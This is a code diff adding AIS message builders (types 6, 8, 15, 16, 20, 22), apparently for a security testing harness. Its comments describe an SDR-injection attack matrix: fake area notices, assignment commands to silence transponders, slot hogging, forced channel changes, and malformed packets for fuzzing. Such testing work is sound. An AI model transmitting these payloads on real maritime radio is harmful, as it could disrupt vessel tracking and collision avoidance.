@@ -106,6 +106,188 @@ def encode_type5_static(mmsi, callsign="", shipname="", shiptype=0):
 
 
 # ----------------------------------------------------------------------------
+# Command / addressed / binary message builders (ITU-R M.1371).
+# These enable the SDR-injection attack matrix: interrogation, assignment,
+# channel management, slot reservation, addressed/broadcast binary.
+# Each returns the message payload bit string (framing/CRC added by the tx backend).
+# ----------------------------------------------------------------------------
+def encode_type6(src_mmsi, dest_mmsi, dac=0, fid=0, app_data_bits="", seqno=0):
+    """Type 6: addressed binary message (for auto-ack tests: send to a transponder).
+    app_data_bits is a bit string of application data (<= 920 bits)."""
+    b = ""
+    b += _bits(6, 6)                # msg type
+    b += _bits(0, 2)                # repeat
+    b += _bits(src_mmsi, 30)
+    b += _bits(seqno, 2)            # sequence number
+    b += _bits(dest_mmsi, 30)
+    b += _bits(0, 1)                # retransmit flag
+    b += _bits(0, 1)                # spare
+    b += _bits(dac, 10)             # designated area code
+    b += _bits(fid, 6)              # functional ID
+    b += app_data_bits
+    return b
+
+
+def encode_type8(src_mmsi, dac=0, fid=0, app_data_bits=""):
+    """Type 8: binary broadcast (for fake area notice / met-hydro / provenance tests).
+    Set dac=1,fid=22 for area notice; dac=1,fid=11 for meteorological/hydrological."""
+    b = ""
+    b += _bits(8, 6)
+    b += _bits(0, 2)
+    b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                # spare
+    b += _bits(dac, 10)
+    b += _bits(fid, 6)
+    b += app_data_bits
+    return b
+
+
+def encode_type15(src_mmsi, dest1_mmsi, msg1_1=5, dest2_mmsi=None, msg2_1=0):
+    """Type 15: interrogation (ask a transponder to reply, e.g. with its Type 5/Type 3).
+    msg1_1 is the requested message type from dest1 (e.g. 3 or 5). 88 bits for single
+    interrogation, longer for two."""
+    b = ""
+    b += _bits(15, 6)
+    b += _bits(0, 2)
+    b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                # spare
+    b += _bits(dest1_mmsi, 30)
+    b += _bits(msg1_1, 6)           # requested message type
+    b += _bits(0, 12)              # slot offset
+    if dest2_mmsi is None:
+        b = b[:88]                  # single interrogation is 88 bits
+    else:
+        b += _bits(0, 2)
+        b += _bits(dest2_mmsi, 30)
+        b += _bits(msg2_1, 6)
+        b += _bits(0, 12)
+        b += _bits(0, 2)
+    return b
+
+
+def encode_type16(src_mmsi, dest_a, offset_a, increment_a,
+                  dest_b=None, offset_b=0, increment_b=0):
+    """Type 16: assignment mode command (rate/slot assignment -> near-silence tests).
+    Assigns a reporting rate/slot to dest_a (and optionally dest_b). 96 or 144 bits."""
+    b = ""
+    b += _bits(16, 6)
+    b += _bits(0, 2)
+    b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                # spare
+    b += _bits(dest_a, 30)
+    b += _bits(offset_a, 12)
+    b += _bits(increment_a, 10)
+    if dest_b is None:
+        b += _bits(0, 4)            # spare -> 96 bits
+    else:
+        b += _bits(dest_b, 30)
+        b += _bits(offset_b, 12)
+        b += _bits(increment_b, 10)
+    return b
+
+
+def encode_type20(src_mmsi, offset1=0, slots1=1, timeout1=7, increment1=0):
+    """Type 20: data-link management (reserve FATDMA slots -> slot hogging via SDR).
+    Reserves slots so other stations avoid them. 72 bits (one reservation block)."""
+    b = ""
+    b += _bits(20, 6)
+    b += _bits(0, 2)
+    b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                # spare
+    b += _bits(offset1, 12)         # slot offset
+    b += _bits(slots1, 4)           # number of slots
+    b += _bits(timeout1, 3)         # timeout (minutes)
+    b += _bits(increment1, 11)      # increment
+    b = (b + "0" * 72)[:72]
+    return b
+
+
+def encode_type22(src_mmsi, channel_a=2087, channel_b=2088, tx_rx=0, power=0,
+                 ne_lon=0, ne_lat=0, sw_lon=0, sw_lat=0, addressed=0,
+                 dest1=None, dest2=None):
+    """Type 22: channel management (force channel/power change -> channel-mgmt tests).
+    Broadcast (regional) by default; set addressed=1 with dest1/dest2 to target a unit.
+    168 bits."""
+    b = ""
+    b += _bits(22, 6)
+    b += _bits(0, 2)
+    b += _bits(src_mmsi, 30)
+    b += _bits(0, 2)                # spare
+    b += _bits(channel_a, 12)       # channel A number
+    b += _bits(channel_b, 12)       # channel B number
+    b += _bits(tx_rx, 4)            # tx/rx mode
+    b += _bits(power, 1)            # power (0=high,1=low)
+    if addressed and dest1 is not None:
+        # addressed form: two destination MMSIs in place of the geo box
+        b += _bits(dest1, 30)
+        b += _bits(dest2 if dest2 else 0, 30)
+    else:
+        b += _bits(ne_lon, 18)      # NE corner lon (1/10 min)
+        b += _bits(ne_lat, 17)      # NE corner lat
+        b += _bits(sw_lon, 18)      # SW corner lon
+        b += _bits(sw_lat, 17)      # SW corner lat
+    b += _bits(addressed, 1)        # addressed flag
+    b += _bits(0, 1)                # bw indicator
+    b += _bits(0, 3)                # transitional zone
+    b = (b + "0" * 168)[:168]
+    return b
+
+
+# ----------------------------------------------------------------------------
+# Malformed / edge-case builders (protocol-fuzzing attacks). These deliberately
+# violate the spec to probe parser robustness. Payload-level malformations only;
+# framing-level ones (bad CRC, truncated frame) are noted where they need the raw
+# modulator path instead of the framing backend.
+# ----------------------------------------------------------------------------
+def encode_type1_raw(mmsi, lat, lon, sog_u=None, cog_u=None, heading=511,
+                     nav_status=0, rot=128, timestamp=60, spare=0):
+    """Type 1 with RAW field values (no unit conversion) so you can inject illegal
+    sentinels/reserved values directly: e.g. sog_u=1023, nav_status=13, cog_u=4000,
+    heading=511, or lat/lon out of range. Fields left None use sensible defaults."""
+    lat_units = int(round(lat * 600000.0))
+    lon_units = int(round(lon * 600000.0))
+    if sog_u is None:
+        sog_u = 0
+    if cog_u is None:
+        cog_u = 0
+    b = ""
+    b += _bits(1, 6)
+    b += _bits(0, 2)
+    b += _bits(mmsi, 30)
+    b += _bits(nav_status, 4)       # nav=13 is reserved/undefined
+    b += _bits(rot, 8)
+    b += _bits(sog_u, 10)           # 1023 = not available sentinel; other values raw
+    b += _bits(1, 1)
+    b += _bits(lon_units, 28)       # can be forced out of range (lon=181 -> huge)
+    b += _bits(lat_units, 27)       # lat=91 -> out of range
+    b += _bits(cog_u, 12)           # 4000 = 400.0 deg, illegal (>360)
+    b += _bits(heading, 9)          # 511 = not available; >359 illegal
+    b += _bits(timestamp, 6)
+    b += _bits(0, 2)
+    b += _bits(spare, 3)            # spare bits: spec says 0; set nonzero to test
+    b += _bits(0, 1)
+    b += _bits(0, 19)
+    return b[:168]
+
+
+def encode_undefined_type(msg_type, mmsi, nbits=168):
+    """A message with an undefined/reserved type (0, or 28+). Body is zero-padded."""
+    b = _bits(msg_type, 6) + _bits(0, 2) + _bits(mmsi, 30)
+    b = (b + "0" * nbits)[:nbits]
+    return b
+
+
+def make_truncated(payload_bits, keep_bits):
+    """Return only the first keep_bits of a payload (truncated message)."""
+    return payload_bits[:keep_bits]
+
+
+def make_oversized(payload_bits, extra_bits):
+    """Append extra_bits of padding beyond the spec length (oversized message)."""
+    return payload_bits + "1" * extra_bits
+
+
+# ----------------------------------------------------------------------------
 # HDLC framing: CRC, bit-stuffing, NRZI, training + flags
 # ----------------------------------------------------------------------------
 def _crc16_ccitt(bits):
